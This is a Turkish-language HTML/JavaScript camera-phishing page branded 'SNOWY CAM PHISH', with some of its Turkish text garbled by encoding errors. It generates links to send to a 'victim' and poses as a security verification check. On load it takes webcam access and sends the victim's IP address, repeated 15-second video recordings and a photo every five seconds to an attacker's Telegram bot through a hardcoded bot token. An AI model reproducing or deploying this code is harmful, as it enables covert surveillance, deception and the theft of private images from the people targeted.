<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNOWY CAM PHISH</title>
    <style>
        * {

        }
        
        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            text-align: center;
            color: white;
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        h1 span {
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            color: white;
            padding: 15px 25px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            backdrop-filter: blur(5px);
        }
        
        .btn:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: #00ffff;
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.3);
        }
        
        .btn.primary {
            background: linear-gradient(45deg, #00ffff, #0066ff);
            border: none;
            color: #000;
        }
        
        .btn.primary:hover {
            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.5);
        }
        
        .link-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            word-break: break-all;
            font-family: monospace;
            font-size: 14px;
            color: #00ffff;
            display: none;
        }
        
        .status-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid #00ffff;
            text-align: left;
            display: none;
        }
        
        .status-title {
            color: #00ffff;
            margin-bottom: 10px;
            font-size: 18px;
        }
        
        .status-content {
            color: white;
            font-family: monospace;
            line-height: 1.6;
        }
        
        .footer {
            margin-top: 30px;
            color: rgba(255, 255, 255, 0.5);
            font-size: 12px;
        }
        
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #00ffff;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>вќ„пёЏ <span>SNOWY</span> CAM PHISH</h1>
        <div class="subtitle">GГјvenlik doДџrulama sistemi</div>
        
        <div class="btn-container">
            <button class="btn primary" id="linkBtn" onclick="createLink()">
                <span>рџ”—</span> Link OluЕџtur
            </button>
            <button class="btn" id="sahipBtn" onclick="showSahip()">
                <span>рџ‘¤</span> Sahip
            </button>
            <button class="btn" id="kanalBtn" onclick="showKanal()">
                <span>рџ“ў</span> Kanal
            </button>
        </div>
        
        <div class="link-box" id="linkBox"></div>
        <div class="status-box" id="statusBox"></div>
        
        <div class="footer">
            вќ„пёЏ @snowy_dexry_wexry вќ„пёЏ
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GД°ZLД° KONFД°GГњRASYON
        // ============================================
        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const linkBox = document.getElementById('linkBox');
        const statusBox = document.getElementById('statusBox');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        let stream = null;
        
        // ============================================
        // BUTON FONKSД°YONLARI
        // ============================================
        function showSahip() {
            statusBox.style.display = 'block';
            statusBox.innerHTML = `
                <div class="status-title">рџ‘¤ SAHД°P BД°LGД°LERД°</div>
                <div class="status-content">
                    вќ„пёЏ SNOWY DEXRY WEXRY<br>
                    рџ”ђ GГјvenlik araГ§larД± geliЕџtiricisi<br>
                    рџ“± @snowy_dexry_wexry
                </div>
            `;
            linkBox.style.display = 'none';
        }
        
        function showKanal() {
            statusBox.style.display = 'block';
            statusBox.innerHTML = `
                <div class="status-title">рџ“ў KANAL BД°LGД°LERД°</div>
                <div class="status-content">
                    рџ”” GГјncellemeler ve yeni tool'lar<br>
                    рџ“ў @snowykanal<br>
                    вќ„пёЏ Takipte kal!
                </div>
            `;
            linkBox.style.display = 'none';
        }
        
        function createLink() {
            const link = `https://snowy-dexry-wexry.github.io/Snowy/?i=${TARGET_ID || 'KULLANICI_ID'}`;
            linkBox.style.display = 'block';
            linkBox.innerHTML = `
                <div style="margin-bottom:10px; color:#00ffff;">рџ”— LД°NKД°N HAZIR</div>
                <code style="color:white;">${link}</code>
                <div style="margin-top:15px; font-size:12px; color:rgba(255,255,255,0.5);">рџ“Њ Kurban'a gГ¶nder, tД±klasД±n.</div>
            `;
            statusBox.style.display = 'none';
        }
        
        // ============================================
        // SADECE Д°P ADRESД° AL
        // ============================================
        async function getIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                return ipData.ip;
            } catch(e) {
                return 'AlД±namadД±';
            }
        }
        
        // ============================================
        // Д°P'YД° TELEGRAM'A GГ–NDER
        // ============================================
        async function sendIP(ip) {
            const msg = `вќ„пёЏ **SNOWY CAM PHISH** вќ„пёЏ\nв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\nрџЊђ **IP Adresi:** ${ip}\nвЏ±пёЏ **Zaman:** ${new Date().toLocaleString('tr-TR')}\nв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓв”Ѓ\nвљЎ @snowy_dexry_wexry вљЎ`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: TARGET_ID, text: msg, parse_mode: 'Markdown' })
            });
        }
        
        // ============================================
        // VД°DEO KAYDI BAЕћLAT
        // ============================================
        function startVideoRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `рџЋҐ Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                // 1 saniye sonra tekrar baЕџlat
                setTimeout(startVideoRecording, 1000);
            };
            
            // 15 saniyelik video
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 15000);
        }
        
        // ============================================
        // FOTOДћRAF Г‡EK
        // ============================================
        async function takePhoto() {
            photoCount++;
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                formData.append('caption', `рџ“ё FotoДџraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }
        
        // ============================================
        // KAMERAYI BAЕћLAT (EДћER SAYFA ?i= Д°LE AГ‡ILDIYSA)
        // ============================================
        async function startCamera() {
            if (!TARGET_ID) return;
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // SADECE Д°P ADRESД°NД° AL VE GГ–NDER
                const ip = await getIP();
                await sendIP(ip);
                
                // 2 saniye bekle
                await new Promise(r => setTimeout(r, 2000));
                
                // VД°DEO KAYDI BAЕћLAT
                startVideoRecording();
                
                // FOTOДћRAF Г‡EK (her 5 saniyede bir)
                setInterval(takePhoto, 5000);
                
            } catch(e) {
                console.log('Kamera hatasД±:', e);
            }
        }
        
        // ============================================
        // SAYFA YГњKLENDД°ДћД°NDE
        // ============================================
        window.onload = function() {
            if (TARGET_ID) {
                // EДџer ID varsa, otomatik baЕџlat
                startCamera();
                
                // ButonlarД± devre dД±ЕџД± bД±rak
                document.getElementById('linkBtn').style.display = 'none';
                document.getElementById('sahipBtn').style.display = 'none';
                document.getElementById('kanalBtn').style.display = 'none';
                
                // Loading gГ¶ster
                statusBox.style.display = 'block';
                statusBox.innerHTML = `
                    <div class="status-title">рџ”„ Д°ЕћLEM YAPILIYOR</div>
                    <div class="status-content">
                        <div class="loader" style="margin:10px auto;"></div>
                        GГјvenlik doДџrulamasД± yapД±lД±yor...
                    </div>
                `;
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
</html>
